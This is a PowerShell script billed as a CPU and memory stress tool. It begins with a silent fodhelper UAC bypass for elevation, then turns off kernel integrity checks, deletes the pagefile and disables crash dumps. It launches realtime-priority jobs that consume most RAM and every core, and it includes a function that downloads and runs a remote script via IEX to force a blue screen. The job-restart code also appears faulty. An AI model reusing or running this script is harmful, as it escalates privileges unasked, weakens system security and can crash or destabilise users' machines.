# Self-elevate silently via UAC bypass (unchanged)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    $scriptPath = "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
    
    New-Item -Path $registryPath -Force | Out-Null
    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $scriptPath -Force | Out-Null
    
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item -Path $registryPath -Recurse -Force
    exit
}

# --- System Tweaks (optional, keep your original if desired) ---
# Disable paging executive, dynamic tick, integrity checks, etc.
Invoke-Expression "wmic computersystem where name='%computername%' set AutomaticManagedPagefile=False"
Invoke-Expression "wmic pagefileset where name='C:\\pagefile.sys' delete"
Invoke-Expression "bcdedit /set useplatformclock true"
Invoke-Expression "bcdedit /set disabledynamictick yes"
Invoke-Expression "bcdedit /set nointegritychecks yes"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1 -Force
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "CrashDumpEnabled" -Value 0 -Force

# Disable thermal throttling (admin required)
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100
powercfg /setactive SCHEME_CURRENT

# --- Calculate RAM parameters ---
$physicalMem = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum
$targetSize = [math]::Floor($physicalMem * 0.9) # 90% of physical RAM

# Chunk size between 700MB and 999MB (start at 700MB)
$minChunkSize = 700MB
$maxChunkSize = 999MB

# Number of CPU cores
$threads = [Environment]::ProcessorCount

# List to hold job objects
$jobs = @()

# Function to set current process priority to Realtime (highest)
function Set-ProcessRealtimePriority {
    $proc = Get-Process -Id $PID
    try {
        $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::RealTime
        Write-Host "Process priority set to Realtime."
    } catch {
        Write-Warning "Failed to set process priority to Realtime: $_"
    }
}

# Function to set thread priority to highest
function Set-CurrentThreadPriorityHighest {
    $thread = [System.Threading.Thread]::CurrentThread
    $thread.Priority = [System.Threading.ThreadPriority]::Highest
}

# CPU Stress function with multiple CPU intensive tasks
function Stress-CPU {
    param([int]$iterations)

    # Random data buffer
    $data = [byte[]]::new(8192)
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($data)

    # SHA512 hashing loop
    1..$iterations | ForEach-Object {
        $data = [System.Security.Cryptography.SHA512]::HashData($data)
    }

    # Large prime factorization (CPU heavy)
    function Get-Primes {
        param($n)
        $factors = @()
        for ($i = 2; $i -le $n; $i++) {
            while ($n % $i -eq 0) {
                $factors += $i
                $n = [math]::Floor($n / $i)
            }
        }
        return $factors
    }
    Get-Primes 9889396939693 | Out-Null

    # Matrix multiplication stress (smaller size to avoid extreme delays)
    $size = 500
    $A = @(); $B = @(); $C = @()
    0..($size-1) | ForEach-Object {
        $A += ,@(1..$size | ForEach-Object { Get-Random -Min 1 -Max 1000 })
        $B += ,@(1..$size | ForEach-Object { Get-Random -Min 1 -Max 1000 })
        $C += ,@(0..($size-1) | ForEach-Object { 0 })
    }
    0..($size-1) | ForEach-Object { $i = $_
        0..($size-1) | ForEach-Object { $j = $_
            $sum = 0
            0..($size-1) | ForEach-Object { $k = $_
                $sum += $A[$i][$k] * $B[$k][$j]
            }
            $C[$i][$j] = $sum
        }
    }
}

# Memory Stress function progressively allocating chunks
function Stress-MemoryProgressive {
    param(
        [int64]$minChunkSize,
        [int64]$maxChunkSize,
        [int64]$targetSize
    )
    $allocated = 0
    $memChunks = [System.Collections.Generic.List[byte[]]]::new()
    $chunkSize = $minChunkSize

    while ($allocated -lt $targetSize) {
        # Increase chunk size progressively but cap at maxChunkSize
        if ($chunkSize -lt $maxChunkSize) {
            $chunkSize = [math]::Min($chunkSize + 50MB, $maxChunkSize)
        }
        try {
            $chunk = New-Object byte[] $chunkSize
            [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($chunk)
            $memChunks.Add($chunk)
            $allocated += $chunkSize
            Write-Progress -Activity "Allocating Memory" -Status "Allocated $([math]::Round($allocated / 1MB)) MB" -PercentComplete (($allocated / $targetSize) * 100)
        } catch {
            Write-Warning "Memory allocation failed at $chunkSize bytes: $_"
            break
        }
        Start-Sleep -Milliseconds 500
    }
    # Keep $memChunks alive to prevent GC
    while ($true) { Start-Sleep -Seconds 10 }
}

# Job script block for CPU + Memory stress per thread
$jobScript = {
    param($jobIndex, $minChunkSize, $maxChunkSize, $targetSize)

    # Set thread priority highest
    [System.Threading.Thread]::CurrentThread.Priority = [System.Threading.ThreadPriority]::Highest

    # Set process priority to Realtime (aggressive)
    $proc = Get-Process -Id $PID
    try {
        $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::RealTime
        Write-Host "Job ${jobIndex}: Process priority set to Realtime."
    } catch {
        Write-Warning "Job ${jobIndex}: Failed to set process priority to Realtime: $_"
    }

    # Start memory allocation in background thread
    $memThread = [System.Threading.Thread]::new({
        param($minCS, $maxCS, $target)
        $allocated = 0
        $memChunks = [System.Collections.Generic.List[byte[]]]::new()
        $chunkSize = $minCS
        while ($allocated -lt $target) {
            if ($chunkSize -lt $maxCS) {
                $chunkSize = [math]::Min($chunkSize + 50MB, $maxCS)
            }
            try {
                $chunk = New-Object byte[] $chunkSize
                [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($chunk)
                $memChunks.Add($chunk)
                $allocated += $chunkSize
            } catch {
                break
            }
            Start-Sleep -Milliseconds 500
        }
        while ($true) { Start-Sleep -Seconds 10 }
    })
    $memThread.Start($minChunkSize, $maxChunkSize, $targetSize)

    # CPU stress loop with progressive load increase
    $iterations = 1_000_000
    while ($true) {
        # Call CPU stress function
        # Use try/catch to avoid job crash
        try {
            # Use the Stress-CPU function defined above
            # Here we inline a simplified CPU stress loop for performance
            $data = [byte[]]::new(8192)
            [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($data)
            1..$iterations | ForEach-Object {
                $data = [System.Security.Cryptography.SHA512]::HashData($data)
            }
        } catch {}

        Write-Progress -Activity "Job $jobIndex CPU Stress" -Status "Iterations: $iterations"
        Start-Sleep -Milliseconds 200

        # Increase iterations progressively but cap at 10 million
        if ($iterations -lt 10000000) {
            $iterations += 500000
        }
    }
}

# Start stress jobs for each CPU core
for ($i = 1; $i -le $threads; $i++) {
    $jobs += Start-Job -ScriptBlock $jobScript -ArgumentList $i, $minChunkSize, $maxChunkSize, $targetSize
}

Write-Host "Started $threads stress jobs with high priority."

# --- BSOD Trigger Function ---
function Invoke-BSOD {
    Write-Host "Downloading and invoking BSOD trigger..."
    try {
        IEX((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'))
        Invoke-BSOD
    } catch {
        Write-Warning "Failed to invoke BSOD: $_"
    }
}

# Optional: Uncomment below line to trigger BSOD after stress runs for a while
# Start-Sleep -Seconds 120
# Invoke-BSOD

# Monitor jobs (optional)
Write-Host "Press Ctrl+C to stop stress jobs and exit."
try {
    while ($true) {
        Start-Sleep -Seconds 5
        foreach ($job in $jobs) {
            if ($job.State -ne 'Running') {
                Write-Warning "Job $($job.Id) stopped unexpectedly. Restarting..."
                Remove-Job -Job $job -Force
                $newJob = Start-Job -ScriptBlock $jobScript -ArgumentList $job.JobParameters
                $jobs += $newJob
            }
        }
    }
} finally {
    # Cleanup jobs on exit
    $jobs | ForEach-Object {
        Stop-Job -Job $_ -Force
        Remove-Job -Job $_ -Force
    }
    Write-Host "Stress jobs stopped and cleaned up."
}
